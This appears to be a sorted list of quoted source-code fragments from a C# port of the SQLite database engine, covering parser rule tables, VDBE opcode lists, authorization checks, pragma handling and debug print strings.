"define sqlite3TableLock(v,w,x,y,z)"
"defines in the header, but are associated"
"dest, 0, sizeof( dest ) )"
"destroyRootPage( pParse, pIdx.tnum, iDb )"
"destroyRootPage( pParse, pTab.tnum, iDb )"
"disableTerm( pLevel, "
"dup8bytes(Vdbe v, const char "
"dwErr = WaitForSingleObject(h, INFINITE)"
"dxFunc xFunc,   //)(sqlite3_context"
"dxStep xStep,   //)(sqlite3_context"
"f"", n, r )"
"false, false, false, false, true, false, false, false, false, false, false, false, false, false, false, false,  /"
"false, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true,  /"
"filename,   /"
"flags, SQLITE_INT_TO_PTR(pTab->nCol"
"for(i=j=0, pTerm=pWC.a"
"for(i=nTerm=0, pTerm=pWC.a"
"for(idx=precision, rounder=0.4999"
"fprintf(out, """
"fprintf(out, ""%02x"", p.aOp[i].opcode)"
"fprintf(out, ""%6d %10lld %8lld "","
"fprintf(out, ""---- "")"
"fprintf(stderr, ""INPUT:  %s"
"fprintf(stderr, ""OUTPUT: %s"
"fprintf(stdout, ""%10llu "", elapsed)"
"fprintf(yyTraceFILE,""%sStack grows to %d entries!"
"freePage(pPage, ref rc)"
"getMask( pMaskSet, iBase )"
"getMask( pMaskSet, pTabList.a[bestJ].iCursor )"
"getMask( pWC.pMaskSet, iCur )"
"i64 iRow,               /"
"iDb = sqlite3SchemaToIndex(pParse->db, pSchema)"
"iReg = sqlite3ExprCodeTarget( pParse, pExpr, target )"
"iReg = sqlite3GetTempRange( pParse, nConstraint "
"id, int pResOut)"
"idxNew = whereClauseInsert( pWC, pNewExpr, TERM_VIRTUAL "
"idxStr,"
"if ( 0 == sqlite3StrICmp( zRight, encnames[iEnc].zName ) )"
"if ( sqlite3AuthCheck( pParse, SQLITE_PRAGMA, zLeft, zRight, zDb ) )"
"if ( sqlite3StrICmp( zLeft, ""lock_proxy_file"" ) == 0 )"
"if ( sqlite3VdbeMemGrow( pMem, (int)nByte, 1 ) != 0 )"
"if ( sqlite3VtabCallConnect( pParse, pTable ) )"
"if ( zRight !="""")"
"if (sqlite3AuthCheck(pParse, SQLITE_SELECT, 0, 0, 0)) return 1"
"if SQLITE_OMIT_TRACE:  Normally, this routine is never called"
"if( 0==sqlite3StrICmp(pCol.zName, zColumnName) ){"
"if( 0==strcmp(zFullPathname, sqlite3PagerFilename(pBt.pPager))"
"if( InterlockedCompareExchange(winMutex_lock, 0, 1)==1 ){"
"if( InterlockedCompareExchange(winMutex_lock, 1, 0)==0 ){"
"if( SQLITE_OK!=sqlite3VdbeChangeEncoding(pOut, encoding) ) goto no_mem"
"if( res.zErrMsg !=""""){"
"if( sqlite3AuthCheck(pParse, SQLITE_ALTER_TABLE, zDb, pTab.zName, 0) ){"
"if( sqlite3AuthCheck(pParse, SQLITE_ANALYZE, pTab.zName, 0,"
"if( sqlite3AuthCheck(pParse, SQLITE_DELETE, pTab.zName, 0, zDb) ){"
"if( sqlite3AuthCheck(pParse, SQLITE_DELETE, zTab, 0, zDb) ){"
"if( sqlite3AuthCheck(pParse, SQLITE_DELETE, zTab, 0, zDb)){"
"if( sqlite3AuthCheck(pParse, SQLITE_INSERT, SCHEMA_TABLE(iDb), 0, zDb) ){"
"if( sqlite3AuthCheck(pParse, SQLITE_INSERT, SCHEMA_TABLE(iTabDb),0,zDb)){"
"if( sqlite3AuthCheck(pParse, SQLITE_INSERT, SCHEMA_TABLE(isTemp), 0, zDb) ){"
"if( sqlite3AuthCheck(pParse, SQLITE_INSERT, pTab.zName, 0, zDb) ){"
"if( sqlite3AuthCheck(pParse, SQLITE_REINDEX, pIndex.zName, 0,"
"if( sqlite3AuthCheck(pParse, code, pIndex.zName, pTab.zName, zDb) ){"
"if( sqlite3AuthCheck(pParse, code, pTab.zName, zArg2, zDb) ){"
"if( sqlite3AuthCheck(pParse, code, pTrigger.name, pTable.zName, zDb) "
"if( sqlite3AuthCheck(pParse, code, zName, pTab.zName, zDbTrig) ){"
"if( sqlite3AuthCheck(pParse, i, zName, pTab.zName, zDb) ){"
"if( sqlite3ExprCheckHeight(pParse, pExpr.nHeight"
"if( sqlite3StrICmp(zLeft, ""activate_extensions"")==0 ){"
"if( sqlite3StrICmp(zLeft, ""key"")==0 "
"if( sqlite3StrICmp(zLeft, ""rekey"")==0 "
"if( sqlite3StrNICmp(zRight, ""cerod-"", 6)==0 ){"
"if( sqlite3StrNICmp(zRight, ""see-"", 4)==0 ){"
"if( vtabBestIndex(pParse, pTab, pIdxInfo) ){"
"if( zExternal!="""" ){"
"if( zSql8 !=""""){"
"if( zTail8 !="""" "
"if(sqlite3StrICmp(pExpr->u.zToken,""match"")!=0 ){"
"ifdef'ed out, so "
"include ""btree.h"""
"include ""btreeInt.h"""
"include ""config.h"""
"include ""hash.h"""
"include ""hwtime.h"""
"include ""keywordhash.h"""
"include ""mutex.h"""
"include ""opcodes.h"""
"include ""os.h"""
"include ""os_common.h"""
"include ""pager.h"""
"include ""parse.h"""
"include ""pcache_g.h"""
"include ""sqlite3.h"""
"include ""sqlite3ext.h"""
"include ""sqliteInt.h"""
"include ""sqliteLimit.h"""
"include ""vdbe.h"""
"include ""vdbeInt.h"""
"includes.  Hence, this block of code must be the very first"
"int aXRef,          /"
"int argc,"
"int code,"
"int eTextRep,"
"int flags,                 /"
"int i, h1, h2"
"int i, j"
"int i, n"
"int i,"
"int iAmt,              /"
"int iDb = sqlite3SchemaToIndex( pParse.db, pTab.pSchema )"
"int iDb,          /"
"int iTab,         /"
"int isIndex,           /"
"int n,"
"int nArg,"
"int nBytes,               /"
"int nBytes,              /"
"int nData,"
"int sqlite3BtreeLockTable(Btree p, int iTab, u8 isWriteLock){"
"int sqlite3BtreePutData(BtCursor pCsr, u32 offset, u32 amt, void "
"int sqlite3_column_numeric_type(sqlite3_stmt pStmt, int i){"
"int sqlite3_wsd_init(int N, int J)"
"jrnlClose,     /"
"jrnlFileSize,  /"
"jrnlRead,      /"
"jrnlSync,      /"
"jrnlTruncate,  /"
"jrnlWrite,     /"
"keyInfo, 0, sizeof(keyInfo ))"
"lTm,"
"line 1003 ""parse.y"""
"line 1016 ""parse.y"""
"line 1020 ""parse.y"""
"line 1049 ""parse.y"""
"line 1056 ""parse.y"""
"line 1057 ""parse.y"""
"line 1062 ""parse.y"""
"line 1066 ""parse.y"""
"line 1077 ""parse.y"""
"line 109 ""parse.y"""
"line 1090 ""parse.y"""
"line 1096 ""parse.y"""
"line 1102 ""parse.y"""
"line 111 ""parse.y"""
"line 1110 ""parse.y"""
"line 1111 ""parse.y"""
"line 1112 ""parse.y"""
"line 1114 ""parse.y"""
"line 1116 ""parse.y"""
"line 112 ""parse.y"""
"line 1134 ""parse.y"""
"line 114 ""parse.y"""
"line 1143 ""parse.y"""
"line 1149 ""parse.y"""
"line 1150 ""parse.y"""
"line 1151 ""parse.y"""
"line 1155 ""parse.y"""
"line 1156 ""parse.y"""
"line 1158 ""parse.y"""
"line 1165 ""parse.y"""
"line 1166 ""parse.y"""
"line 1169 ""parse.y"""
"line 1170 ""parse.y"""
"line 1176 ""parse.y"""
"line 1188 ""parse.y"""
"line 119 ""parse.y"""
"line 1200 ""parse.y"""
"line 1205 ""parse.y"""
"line 1218 ""parse.y"""
"line 1223 ""parse.y"""
"line 1226 ""parse.y"""
"line 1230 ""parse.y"""
"line 1233 ""parse.y"""
"line 1236 ""parse.y"""
"line 124 ""parse.y"""
"line 1244 ""parse.y"""
"line 125 ""parse.y"""
"line 1255 ""parse.y"""
"line 1257 ""parse.y"""
"line 1262 ""parse.y"""
"line 1269 ""parse.y"""
"line 1272 ""parse.y"""
"line 128 ""parse.y"""
"line 1287 ""parse.y"""
"line 1288 ""parse.y"""
"line 129 ""parse.c"""
"line 1293 ""parse.y"""
"line 1294 ""parse.y"""
"line 1299 ""parse.y"""
"line 130 ""parse.y"""
"line 1302 ""parse.y"""
"line 1305 ""parse.y"""
"line 1315 ""parse.y"""
"line 1316 ""parse.y"""
"line 1317 ""parse.y"""
"line 1322 ""parse.y"""
"line 1324 ""parse.y"""
"line 134 ""parse.y"""
"line 137 ""parse.y"""
"line 1373 ""parse.c"""
"line 1382 ""parse.c"""
"line 140 ""parse.y"""
"line 1400 ""parse.c"""
"line 1410 ""parse.c"""
"line 1424 ""parse.c"""
"line 1433 ""parse.c"""
"line 1441 ""parse.c"""
"line 1448 ""parse.c"""
"line 147 ""parse.y"""
"line 150 ""parse.y"""
"line 155 ""parse.y"""
"line 156 ""parse.y"""
"line 162 ""parse.y"""
"line 1632  ""parse.c"""
"line 165 ""parse.y"""
"line 177 ""parse.y"""
"line 181 ""parse.y"""
"line 191 ""parse.y"""
"line 2075 ""parse.c"""
"line 2080 ""parse.c"""
"line 2085 ""parse.c"""
"line 2090 ""parse.c"""
"line 2095 ""parse.c"""
"line 2100 ""parse.c"""
"line 2109 ""parse.c"""
"line 2115 ""parse.c"""
"line 2120 ""parse.c"""
"line 2127 ""parse.c"""
"line 2134 ""parse.c"""
"line 2141 ""parse.c"""
"line 2148 ""parse.c"""
"line 2156 ""parse.c"""
"line 2171 ""parse.c"""
"line 2183 ""parse.c"""
"line 2190 ""parse.c"""
"line 2198 ""parse.c"""
"line 2206 ""parse.c"""
"line 2214 ""parse.c"""
"line 2240 ""parse.c"""
"line 2245 ""parse.c"""
"line 2253 ""parse.c"""
"line 2261 ""parse.c"""
"line 2266 ""parse.c"""
"line 2272 ""parse.c"""
"line 2277 ""parse.c"""
"line 2288 ""parse.c"""
"line 2297 ""parse.c"""
"line 2302 ""parse.c"""
"line 2307 ""parse.c"""
"line 2312 ""parse.c"""
"line 2317 ""parse.c"""
"line 2322 ""parse.c"""
"line 2327 ""parse.c"""
"line 2332 ""parse.c"""
"line 2337 ""parse.c"""
"line 2342 ""parse.c"""
"line 2347 ""parse.c"""
"line 2352 ""parse.c"""
"line 2357 ""parse.c"""
"line 2362 ""parse.c"""
"line 2367 ""parse.c"""
"line 2372 ""parse.c"""
"line 2377 ""parse.c"""
"line 2382 ""parse.c"""
"line 2391 ""parse.c"""
"line 2396 ""parse.c"""
"line 2401 ""parse.c"""
"line 2406 ""parse.c"""
"line 2411 ""parse.c"""
"line 2416 ""parse.c"""
"line 2424 ""parse.c"""
"line 2429 ""parse.c"""
"line 2434 ""parse.c"""
"line 2439 ""parse.c"""
"line 2444 ""parse.c"""
"line 2449 ""parse.c"""
"line 2456 ""parse.c"""
"line 2463 ""parse.c"""
"line 2470 ""parse.c"""
"line 2479 ""parse.c"""
"line 2484 ""parse.c"""
"line 2497 ""parse.c"""
"line 2502 ""parse.c"""
"line 2509 ""parse.c"""
"line 2515 ""parse.c"""
"line 2524 ""parse.c"""
"line 253 ""parse.y"""
"line 2533 ""parse.c"""
"line 2541 ""parse.c"""
"line 255 ""parse.y"""
"line 2551 ""parse.c"""
"line 2556 ""parse.c"""
"line 2561 ""parse.c"""
"line 2569 ""parse.c"""
"line 2577 ""parse.c"""
"line 2582 ""parse.c"""
"line 259 ""parse.y"""
"line 2590 ""parse.c"""
"line 2597 ""parse.c"""
"line 2611 ""parse.c"""
"line 2617 ""parse.c"""
"line 2622 ""parse.c"""
"line 2627 ""parse.c"""
"line 2632 ""parse.c"""
"line 2637 ""parse.c"""
"line 2642 ""parse.c"""
"line 265 ""parse.y"""
"line 2652 ""parse.c"""
"line 2661 ""parse.c"""
"line 2666 ""parse.c"""
"line 2672 ""parse.c"""
"line 2678 ""parse.c"""
"line 2685 ""parse.c"""
"line 2693 ""parse.c"""
"line 2701 ""parse.c"""
"line 2707 ""parse.c"""
"line 2712 ""parse.c"""
"line 2717 ""parse.c"""
"line 2722 ""parse.c"""
"line 2727 ""parse.c"""
"line 2732 ""parse.c"""
"line 2740 ""parse.c"""
"line 2749 ""parse.c"""
"line 2757 ""parse.c"""
"line 276 ""parse.y"""
"line 2765 ""parse.c"""
"line 277 ""parse.y"""
"line 2770 ""parse.c"""
"line 2775 ""parse.c"""
"line 2780 ""parse.c"""
"line 2785 ""parse.c"""
"line 279 ""parse.y"""
"line 2790 ""parse.c"""
"line 2796 ""parse.c"""
"line 2802 ""parse.c"""
"line 2807 ""parse.c"""
"line 2812 ""parse.c"""
"line 2818 ""parse.c"""
"line 2823 ""parse.c"""
"line 2830 ""parse.c"""
"line 2836 ""parse.c"""
"line 2846 ""parse.c"""
"line 2858 ""parse.c"""
"line 286 ""parse.y"""
"line 2875 ""parse.c"""
"line 2884 ""parse.c"""
"line 2893 ""parse.c"""
"line 2901 ""parse.c"""
"line 2915 ""parse.c"""
"line 2923 ""parse.c"""
"line 2936 ""parse.c"""
"line 2948 ""parse.c"""
"line 2954 ""parse.c"""
"line 296 ""parse.y"""
"line 2960 ""parse.c"""
"line 2965 ""parse.c"""
"line 298 ""parse.y"""
"line 2982 ""parse.c"""
"line 2987 ""parse.c"""
"line 299 ""parse.y"""
"line 2992 ""parse.c"""
"line 2997 ""parse.c"""
"line 300 ""parse.y"""
"line 3002 ""parse.c"""
"line 3008 ""parse.c"""
"line 3013 ""parse.c"""
"line 3018 ""parse.c"""
"line 302 ""parse.y"""
"line 303 ""parse.y"""
"line 3035 ""parse.c"""
"line 304 ""parse.y"""
"line 3051 ""parse.c"""
"line 3067 ""parse.c"""
"line 3084 ""parse.c"""
"line 3102 ""parse.c"""
"line 3118 ""parse.c"""
"line 3133 ""parse.c"""
"line 3141 ""parse.c"""
"line 3149 ""parse.c"""
"line 3158 ""parse.c"""
"line 3164 ""parse.c"""
"line 3169 ""parse.c"""
"line 317 ""parse.y"""
"line 318 ""parse.y"""
"line 3184 ""parse.c"""
"line 3199 ""parse.c"""
"line 320 ""parse.y"""
"line 3204 ""parse.c"""
"line 3209 ""parse.c"""
"line 321 ""parse.y"""
"line 3215 ""parse.c"""
"line 322 ""parse.y"""
"line 3220 ""parse.c"""
"line 3225 ""parse.c"""
"line 323 ""parse.y"""
"line 3230 ""parse.c"""
"line 3235 ""parse.c"""
"line 3240 ""parse.c"""
"line 325 ""parse.y"""
"line 3250 ""parse.c"""
"line 3258 ""parse.c"""
"line 326 ""parse.y"""
"line 3264 ""parse.c"""
"line 3269 ""parse.c"""
"line 327 ""parse.y"""
"line 3274 ""parse.c"""
"line 328 ""parse.y"""
"line 3280 ""parse.c"""
"line 3285 ""parse.c"""
"line 3291 ""parse.c"""
"line 3297 ""parse.c"""
"line 330 ""parse.y"""
"line 3307 ""parse.c"""
"line 3316 ""parse.c"""
"line 3326 ""parse.c"""
"line 3335 ""parse.c"""
"line 3344 ""parse.c"""
"line 3349 ""parse.c"""
"line 3354 ""parse.c"""
"line 3359 ""parse.c"""
"line 3364 ""parse.c"""
"line 3369 ""parse.c"""
"line 3381 ""parse.c"""
"line 3393 ""parse.c"""
"line 3398 ""parse.c"""
"line 34 ""parse.y"""
"line 340 ""parse.y"""
"line 3403 ""parse.c"""
"line 341 ""parse.y"""
"line 3410 ""parse.c"""
"line 3417 ""parse.c"""
"line 3424 ""parse.c"""
"line 3429 ""parse.c"""
"line 3434 ""parse.c"""
"line 3439 ""parse.c"""
"line 3444 ""parse.c"""
"line 3451 ""parse.c"""
"line 3458 ""parse.c"""
"line 3466 ""parse.c"""
"line 347 ""parse.y"""
"line 3471 ""parse.c"""
"line 3476 ""parse.c"""
"line 3483 ""parse.c"""
"line 3488 ""parse.c"""
"line 349 ""parse.y"""
"line 3495 ""parse.c"""
"line 351 ""parse.y"""
"line 353 ""parse.y"""
"line 3603 ""parse.c"""
"line 367 ""parse.y"""
"line 369 ""parse.y"""
"line 370 ""parse.y"""
"line 372 ""parse.y"""
"line 373 ""parse.y"""
"line 377 ""parse.y"""
"line 387 ""parse.y"""
"line 390 ""parse.y"""
"line 397 ""parse.y"""
"line 40 ""parse.y"""
"line 404 ""parse.y"""
"line 408 ""parse.y"""
"line 410 ""parse.y"""
"line 421 ""parse.y"""
"line 425 ""parse.y"""
"line 446 ""parse.y"""
"line 447 ""parse.y"""
"line 448 ""parse.y"""
"line 453 ""parse.y"""
"line 457 ""parse.y"""
"line 470 ""parse.y"""
"line 482 ""parse.y"""
"line 483 ""parse.y"""
"line 491 ""parse.y"""
"line 495 ""parse.y"""
"line 496 ""parse.y"""
"line 502 ""parse.y"""
"line 506 ""parse.y"""
"line 53 ""parse.y"""
"line 531 ""parse.y"""
"line 535 ""parse.y"""
"line 536 ""parse.y"""
"line 540 ""parse.y"""
"line 541 ""parse.y"""
"line 542 ""parse.y"""
"line 544 ""parse.y"""
"line 548 ""parse.y"""
"line 549 ""parse.y"""
"line 564 ""parse.y"""
"line 567 ""parse.y"""
"line 568 ""parse.y"""
"line 569 ""parse.y""null"
"line 580 ""parse.y"""
"line 581 ""parse.y"""
"line 585 ""parse.y"""
"line 593 ""parse.y"""
"line 594 ""parse.y"""
"line 620 ""parse.y"""
"line 621 ""parse.y"""
"line 623 ""parse.y"""
"line 625 ""parse.y"""
"line 638 ""parse.y"""
"line 645 ""parse.y"""
"line 661 ""parse.y"""
"line 671 ""parse.y"""
"line 675 ""parse.y"""
"line 684 ""parse.y"""
"line 686 ""parse.y"""
"line 688 ""parse.y"""
"line 691 ""parse.y"""
"line 692 ""parse.y"""
"line 699 ""parse.y"""
"line 701 ""parse.y"""
"line 711 ""parse.y"""
"line 713 ""parse.y"""
"line 721 ""parse.y"""
"line 723 ""parse.y"""
"line 744 ""parse.y"""
"line 745 ""parse.y"""
"line 746 ""parse.y"""
"line 747 ""parse.y"""
"line 749 ""parse.y"""
"line 755 ""parse.y"""
"line 765 ""parse.y"""
"line 778 ""parse.y"""
"line 783 ""parse.y"""
"line 789 ""parse.y"""
"line 794 ""parse.y"""
"line 804 ""parse.y"""
"line 808 ""parse.y"""
"line 818 ""parse.y"""
"line 835 ""parse.y"""
"line 848 ""parse.y"""
"line 849 ""parse.y"""
"line 855 ""parse.y"""
"line 856 ""parse.y"""
"line 870 ""parse.y"""
"line 886 ""parse.y"""
"line 887 ""parse.y"""
"line 888 ""parse.y"""
"line 890 ""parse.y"""
"line 892 ""parse.y"""
"line 910 ""parse.y"""
"line 913 ""parse.y"""
"line 915 ""parse.y"""
"line 920 ""parse.y"""
"line 937 ""parse.y"""
"line 949 ""parse.y"""
"line 961 ""parse.y"""
"line 974 ""parse.y"""
"line 988 ""parse.y"""
"m, 0, sizeof(m))"
"m, SQLITE_UTF8)"
"m, z, nByte, SQLITE_UTF16NATIVE, SQLITE_STATIC)"
"mem0, 0, sizeof(mem0))"
"memcpy(aOvflSpace[apDiv[i]-pParent.aData], apDiv[i], szNew[i])"
"memcpy(p.zBuf[iOfst], zBuf, iAmt)"
"memcpy(pNew, aArg, nArg"
"memcpy(zBuf, "
"memset( pHash, 0, sizeof( sqlite3GlobalFunctions ) )"
"memset(data[hdr], 0, pBt.usableSize - hdr)"
"memset(data[start], 0, size)"
"memset(p, 0, sqlite3JournalSize(pVfs))"
"memset(pCost, 0, sizeof("
"memset(pPage.aData, 0, pPage.pBt.pageSize)"
"memset(yyminorunion, 0, yyminorunion).Length"
"n  """
"n = sqlite3GetVarint( p, offset, ref v64 )"
"n"" )"
"n"", 1)"
"n"", FILEHANDLEID( pPager.fd ), pPager.zFilename )"
"n"", PAGERID( pPager ) )"
"n"", PAGERID( pPager ), pPg.pgno )"
"n"", PAGERID( pPager ), pgno )"
"n"", bestJ,"
"n"", cnt )"
"n"", cost )"
"n"", db.aDb[i].zName ),"
"n"", error )"
"n"", fs.GetHashCode(), fs.Name )"
"n"", iPage, pTrunk.pgno)"
"n"", id.fs.GetHashCode(), id.locktype )"
"n"", id.fs.Name, nByte )"
"n"", key, eType, parent)"
"n"", p.estimatedCost )"
"n"", p.idxNum )"
"n"", p.idxStr )"
"n"", p.orderByConsumed )"
"n"", pCost.rCost )"
"n"", pFile.fs.GetHashCode(), locktype,"
"n"", pFile.fs.GetHashCode(), pFile.fs.Name )"
"n"", pFile.fs.GetHashCode(), pFile.locktype )"
"n"", pFile.fs.GetHashCode(), rc )"
"n"", pFile.fs.GetHashCode(),"
"n"", pFile.fs.Name, rc )"
"n"", pPage.pgno, iTrunk)"
"n"", pPage.pgno, pParent.pgno)"
"n"", pPager )"
"n"", pPager, N )"
"n"", pPager, dbFileVers.Length )"
"n"", pPager, locktype )"
"n"", pPager, pPager.journalHdr )"
"n"", pPager, pPager.journalHdr, nHeader )"
"n"", pPager, pPager.zFilename )"
"n"", pPager, pPg.pgno )"
"n"", pPager, pPg.pgno, pgno )"
"n"", pPager, pPg.pgno,"
"n"", pPager, pgno )"
"n"", pPg.pgno, PAGERID( pPager ) )"
"n"", pPgno)"
"n"", pPgno, n - 1)"
"n"", pProbe.zName )"
"n"", pRoot.pgno, pChild.pgno)"
"n"", pSrc.pTab.zName)"
"n"", pSrc.pTab.zName, notReady )"
"n"", pTab.zName)"
"n"", rTotal )"
"n"", rTotal, nRow )"
"n"", rc )"
"n"", res )"
"n"", url, username, password)"
"n"", yyTracePrompt)"
"n"", yyTracePrompt, yyNewState)"
"n"", yyTracePrompt, yyTokenName[yymajor])"
"n"", yyTracePrompt,"
"n"", z )"
"n"", z.Trim() )"
"n"", zBuf)"
"n"", zBuf.ToString() )"
"n"", zFilename )"
"n"", zTrace )"
"nSkip, pCell"
"nSkip, sz-nSkip)"
"nc, 0, sizeof( nc ) )"
"new                    VdbeOpList( OP_IfNeg,       1, 0,        0),    /"
"new    VdbeOpList( OP_String8,     0, 3,        0),    /"
"new   VdbeOpList( OP_Integer,        0,  1,  0),    /"
"new  VdbeOpList( OP_ResultRow,   3, 1,        0),"
"new EncName( ""UTF-16"",   0                  ), /"
"new EncName( ""UTF-16be"", SQLITE_UTF16BE     ), /"
"new EncName( ""UTF-16le"", SQLITE_UTF16LE     ),/"
"new EncName( ""UTF-8"",    SQLITE_UTF8        ),/"
"new EncName( ""UTF16"",    0                  ), /"
"new EncName( ""UTF16be"",  SQLITE_UTF16BE     ),"
"new EncName( ""UTF16le"",  SQLITE_UTF16LE     ),"
"new EncName( ""UTF8"",     SQLITE_UTF8        ),"
"new EncName( null, 0 )"
"new FuncDef( 0,SQLITE_UTF8,SQLITE_FUNC_COUNT,null,null,null,countStep,countFinalize,""count"",null),"
"new VdbeOpList(  OP_Halt,        0,  0,  0),"
"new VdbeOpList(  OP_IfPos,       1,  0,  0),    /"
"new VdbeOpList( OP_AddImm,       1, -1,  0),"
"new VdbeOpList( OP_AddImm,       3,  1,  0),"
"new VdbeOpList( OP_AddImm,      1, -1,  0),"
"new VdbeOpList( OP_AddImm,      1, 0,        0),    /"
"new VdbeOpList( OP_Column,     0, 0,        2),"
"new VdbeOpList( OP_Column,     0, 1,        2),"
"new VdbeOpList( OP_Concat,       3,  2,  2),"
"new VdbeOpList( OP_Concat,      4,  3,  3),"
"new VdbeOpList( OP_Concat,      5,  3,  3),"
"new VdbeOpList( OP_Concat,      6,  3,  3),"
"new VdbeOpList( OP_Delete,     0, 0,        0),"
"new VdbeOpList( OP_Eq,           2,  0,  3),  /"
"new VdbeOpList( OP_Halt,           SQLITE_OK,       OE_Abort, 0),    /"
"new VdbeOpList( OP_If,             1,               0,        0),    /"
"new VdbeOpList( OP_IfPos,       1, 7,        0),"
"new VdbeOpList( OP_Integer,        0,               1,        0),    /"
"new VdbeOpList( OP_Integer,      0,  3,  0),"
"new VdbeOpList( OP_Integer,     0, 1,        0),  /"
"new VdbeOpList( OP_Integer,     0, 2,        0),"
"new VdbeOpList( OP_Ne,         2, ADDR(8),  1),"
"new VdbeOpList( OP_Next,         0,  0,  0),  /"
"new VdbeOpList( OP_Next,       0, ADDR(1),  0), /"
"new VdbeOpList( OP_ReadCookie,      0,  1,  0),    /"
"new VdbeOpList( OP_ReadCookie,     0,               1,        BTREE_LARGEST_ROOT_PAGE),    /"
"new VdbeOpList( OP_ReadCookie,  0, 1,        BTREE_DEFAULT_CACHE_SIZE),  /"
"new VdbeOpList( OP_ResultRow,       1,  1,  0)"
"new VdbeOpList( OP_ResultRow,    2,  1,  0),"
"new VdbeOpList( OP_ResultRow,   1, 1,        0),"
"new VdbeOpList( OP_ResultRow,   3,  1,  0),"
"new VdbeOpList( OP_Rewind,       0,  0,  0),  /"
"new VdbeOpList( OP_Rewind,     0, ADDR(9),  0),"
"new VdbeOpList( OP_Rowid,       1,  4,  0),"
"new VdbeOpList( OP_SetCookie,      0,               BTREE_INCR_VACUUM, 1),    /"
"new VdbeOpList( OP_SetCookie,      0,  0,  1),    /"
"new VdbeOpList( OP_String8,      0,  2,  0),  /"
"new VdbeOpList( OP_String8,      0,  3,  0),  /"
"new VdbeOpList( OP_String8,     0,  3,  0),    /"
"new VdbeOpList( OP_String8,     0,  5,  0),    /"
"new VdbeOpList( OP_String8,     0,  6,  0),    /"
"new VdbeOpList( OP_String8,    0, 1,        0), /"
"new VdbeOpList( OP_Subtract,    1, 2,        1),"
"new VdbeOpList( OP_Transaction,     0,  0,  0),    /"
"new VdbeOpList( OP_Transaction,    0,               1,        0),    /"
"new VdbeOpList( OP_Transaction,    0,  1,  0),    /"
"new VdbeOpList( OP_Transaction, 0, 0,        0),                         /"
"new _yyRuleInfo( 142, 1 ),"
"new _yyRuleInfo( 143, 1 ),"
"new _yyRuleInfo( 143, 2 ),"
"new _yyRuleInfo( 144, 1 ),"
"new _yyRuleInfo( 144, 3 ),"
"new _yyRuleInfo( 145, 0 ),"
"new _yyRuleInfo( 145, 1 ),"
"new _yyRuleInfo( 145, 3 ),"
"new _yyRuleInfo( 146, 1 ),"
"new _yyRuleInfo( 147, 1 ),"
"new _yyRuleInfo( 147, 11 ),"
"new _yyRuleInfo( 147, 2 ),"
"new _yyRuleInfo( 147, 3 ),"
"new _yyRuleInfo( 147, 4 ),"
"new _yyRuleInfo( 147, 5 ),"
"new _yyRuleInfo( 147, 6 ),"
"new _yyRuleInfo( 147, 7 ),"
"new _yyRuleInfo( 147, 8 ),"
"new _yyRuleInfo( 148, 0 ),"
"new _yyRuleInfo( 148, 1 ),"
"new _yyRuleInfo( 149, 0 ),"
"new _yyRuleInfo( 149, 1 ),"
"new _yyRuleInfo( 149, 2 ),"
"new _yyRuleInfo( 150, 1 ),"
"new _yyRuleInfo( 151, 0 ),"
"new _yyRuleInfo( 151, 1 ),"
"new _yyRuleInfo( 152, 6 ),"
"new _yyRuleInfo( 153, 2 ),"
"new _yyRuleInfo( 153, 4 ),"
"new _yyRuleInfo( 154, 1 ),"
"new _yyRuleInfo( 155, 0 ),"
"new _yyRuleInfo( 155, 1 ),"
"new _yyRuleInfo( 156, 0 ),"
"new _yyRuleInfo( 156, 3 ),"
"new _yyRuleInfo( 157, 0 ),"
"new _yyRuleInfo( 157, 2 ),"
"new _yyRuleInfo( 158, 1 ),"
"new _yyRuleInfo( 158, 3 ),"
"new _yyRuleInfo( 159, 0 ),"
"new _yyRuleInfo( 159, 2 ),"
"new _yyRuleInfo( 160, 1 ),"
"new _yyRuleInfo( 160, 3 ),"
"new _yyRuleInfo( 161, 3 ),"
"new _yyRuleInfo( 162, 1 ),"
"new _yyRuleInfo( 163, 0 ),"
"new _yyRuleInfo( 163, 1 ),"
"new _yyRuleInfo( 164, 0 ),"
"new _yyRuleInfo( 164, 2 ),"
"new _yyRuleInfo( 165, 1 ),"
"new _yyRuleInfo( 166, 1 ),"
"new _yyRuleInfo( 167, 1 ),"
"new _yyRuleInfo( 167, 4 ),"
"new _yyRuleInfo( 167, 6 ),"
"new _yyRuleInfo( 168, 1 ),"
"new _yyRuleInfo( 168, 2 ),"
"new _yyRuleInfo( 169, 1 ),"
"new _yyRuleInfo( 170, 2 ),"
"new _yyRuleInfo( 171, 2 ),"
"new _yyRuleInfo( 172, 1 ),"
"new _yyRuleInfo( 172, 3 ),"
"new _yyRuleInfo( 173, 1 ),"
"new _yyRuleInfo( 173, 2 ),"
"new _yyRuleInfo( 173, 3 ),"
"new _yyRuleInfo( 173, 4 ),"
"new _yyRuleInfo( 173, 5 ),"
"new _yyRuleInfo( 174, 1 ),"
"new _yyRuleInfo( 175, 1 ),"
"new _yyRuleInfo( 175, 2 ),"
"new _yyRuleInfo( 175, 3 ),"
"new _yyRuleInfo( 175, 4 ),"
"new _yyRuleInfo( 175, 5 ),"
"new _yyRuleInfo( 175, 6 ),"
"new _yyRuleInfo( 176, 0 ),"
"new _yyRuleInfo( 176, 3 ),"
"new _yyRuleInfo( 177, 0 ),"
"new _yyRuleInfo( 177, 1 ),"
"new _yyRuleInfo( 178, 0 ),"
"new _yyRuleInfo( 178, 1 ),"
"new _yyRuleInfo( 179, 0 ),"
"new _yyRuleInfo( 179, 3 ),"
"new _yyRuleInfo( 180, 0 ),"
"new _yyRuleInfo( 180, 2 ),"
"new _yyRuleInfo( 181, 2 ),"
"new _yyRuleInfo( 181, 3 ),"
"new _yyRuleInfo( 182, 2 ),"
"new _yyRuleInfo( 182, 3 ),"
"new _yyRuleInfo( 183, 1 ),"
"new _yyRuleInfo( 183, 2 ),"
"new _yyRuleInfo( 184, 0 ),"
"new _yyRuleInfo( 184, 2 ),"
"new _yyRuleInfo( 185, 1 ),"
"new _yyRuleInfo( 185, 2 ),"
"new _yyRuleInfo( 185, 3 ),"
"new _yyRuleInfo( 186, 10 ),"
"new _yyRuleInfo( 186, 2 ),"
"new _yyRuleInfo( 186, 5 ),"
"new _yyRuleInfo( 186, 7 ),"
"new _yyRuleInfo( 187, 3 ),"
"new _yyRuleInfo( 187, 5 ),"
"new _yyRuleInfo( 188, 0 ),"
"new _yyRuleInfo( 188, 1 ),"
"new _yyRuleInfo( 189, 0 ),"
"new _yyRuleInfo( 189, 2 ),"
"new _yyRuleInfo( 190, 1 ),"
"new _yyRuleInfo( 191, 1 ),"
"new _yyRuleInfo( 192, 0 ),"
"new _yyRuleInfo( 192, 2 ),"
